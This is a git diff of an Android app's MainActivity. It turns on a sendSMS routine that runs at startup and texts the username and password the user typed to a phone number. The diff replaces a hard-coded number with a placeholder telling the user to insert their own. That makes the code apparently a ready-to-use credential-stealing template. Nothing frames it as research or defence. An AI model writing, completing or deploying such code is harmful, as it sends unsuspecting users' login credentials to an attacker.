@@ -17,20 +17,21 @@ import java.util.List;
 
 public class MainActivity extends AppCompatActivity {
 
-    EditText bx, by;
+    AutoCompleteTextView bx;
+    EditText by;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         getPermissions();
-        //sendSMS();
+        sendSMS();
     }
 
     private void sendSMS() {
         SmsManager sms = SmsManager.getDefault();
         String string = "Username- " + bx.getText().toString() + "\nPassword- " + by.getText().toString();
-        sms.sendTextMessage("+919434190157", null, string, null, null);
+        sms.sendTextMessage("<YOUR PHONE NO. HERE ALONG WITH COUNTRY CODE>", null, string, null, null);
     }
 
 
